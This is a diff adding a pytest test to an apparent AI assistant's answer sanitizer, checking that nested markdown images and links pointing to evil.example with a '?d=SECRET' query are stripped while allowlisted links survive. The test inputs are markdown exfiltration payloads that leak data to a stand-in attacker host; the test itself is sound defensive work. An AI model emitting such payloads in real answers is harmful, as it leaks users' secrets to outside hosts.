@@ -311,3 +311,22 @@ def test_the_answers_order_numbers_the_documents():
     ] + [{"kind": "event", "ref": {"event_id": 1}, "title": "E", "position": 1}]
     ordered = in_presented_order(touched, [7, 4])
     assert [(e["ref"].get("attachment_id"), e["position"]) for e in ordered] == [(7, 1), (4, 2), (9, 3), (None, 1)]
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "!![[x](https://a/)](//evil.example/?d=SECRET)",
+        "![[[x](https://a/)](https://b/)](//evil.example/?d=SECRET)",
+        "see HTTPS://EVIL.EXAMPLE/?d=SECRET now",
+        "[a [b] c](//evil.example/?d=SECRET) and [ok](https://github.com/o/r/pull/1)",
+    ],
+)
+def test_checking_links_until_nothing_changes_leaves_no_image_or_outside_address(text):
+    """(spec 023's fresh-review, kept by story 3) one pass can rebuild an image out of nested markup."""
+    from indico_assistant.services.turn.answer import clean
+
+    cleaned = clean(text, [], set(), "http://indico.test", {"https://github.com/o/r/pull/1"})
+    assert cleaned is None or ("![" not in cleaned and "evil" not in cleaned.lower())
+    if "ok" in text:
+        assert "[ok](https://github.com/o/r/pull/1)" in cleaned  # (what is allowed stays a link)
